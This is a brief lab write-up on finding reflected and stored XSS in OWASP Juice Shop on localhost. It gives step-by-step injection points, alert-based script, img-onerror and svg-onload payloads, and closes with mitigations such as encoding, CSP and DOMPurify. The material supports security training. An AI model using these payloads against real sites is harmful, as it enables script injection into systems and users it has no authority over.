`XSS-on-JuiceShop.md` – Stored and reflected XSS on OWASP Juice Shop
# XSS-on-JuiceShop.md
```markdown
# ✨ XSS Testing on OWASP Juice Shop

🔧 Environment
- **App**: OWASP Juice Shop (latest)
- **Tools**: Chrome DevTools, Burp Suite, Firefox

🌟 Objective
Find and exploit **stored** and **reflected** XSS vulnerabilities in Juice Shop.

---

⚡ Reflected XSS Test

 1. Search Field:
Navigate to: `http://localhost:3000/#/search?q=<script>alert(1)</script>`

2. Observe
- If the alert box appears: **Reflected XSS Confirmed**

---

 📊 Stored XSS Test

# 1. Create a Review:
1. Register/Login
2. Go to any product → Click "Review"
3. Payload: `<script>alert('StoredXSS')</script>`
4. Submit and reload page

2. Observe
- Alert is triggered every time the page is loaded

---

 🚨 Payload Variants
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>
```

---

 ✅ Mitigations
- Use HTML encoding libraries
- Implement CSP headers
- Sanitize user inputs with DOMPurify or similar

